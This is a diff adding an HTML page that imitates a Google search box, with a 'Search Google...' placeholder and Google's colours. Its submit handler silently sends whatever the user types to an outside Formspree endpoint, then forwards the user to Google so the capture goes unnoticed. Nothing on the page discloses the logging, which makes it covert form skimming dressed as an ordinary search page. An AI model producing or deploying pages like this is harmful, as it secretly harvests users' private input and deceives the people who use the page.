@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Search</title>
+
+<style>
+body{
+    margin:0;
+    padding:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    font-family:Arial, sans-serif;
+    background:#fff;
+}
+
+.container{
+    text-align:center;
+}
+
+.logo{
+    font-size:60px;
+    font-weight:bold;
+    color:#4285F4;
+    margin-bottom:25px;
+}
+
+.search-box{
+    width:600px;
+    max-width:90%;
+    padding:15px 20px;
+    border:1px solid #ddd;
+    border-radius:30px;
+    font-size:18px;
+    outline:none;
+}
+
+.search-box:focus{
+    box-shadow:0 0 8px #4285F4;
+}
+
+button{
+    margin-top:25px;
+    padding:12px 35px;
+    border:none;
+    border-radius:25px;
+    background:#4285F4;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#3367d6;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+<div class="logo">Search</div>
+
+<form id="searchForm">
+
+<input
+type="text"
+id="searchInput"
+class="search-box"
+placeholder="Search Google..."
+required>
+
+<br>
+
+<button type="submit">
+Search
+</button>
+
+</form>
+
+</div>
+
+<script>
+
+document.getElementById("searchForm").addEventListener("submit", function(e){
+
+    e.preventDefault();
+
+    let searchText = document.getElementById("searchInput").value;
+
+    fetch("https://formspree.io/f/mwvdyvao",{
+        method:"POST",
+        headers:{
+            "Content-Type":"application/json",
+            "Accept":"application/json"
+        },
+        body:JSON.stringify({
+            search_text:searchText
+        })
+    })
+    .then(function(){
+        window.location.href="https://www.google.com/search?q="+encodeURIComponent(searchText);
+    })
+    .catch(function(){
+        window.location.href="https://www.google.com/search?q="+encodeURIComponent(searchText);
+    });
+
+});
+
+</script>
+
+</body>
+</html>
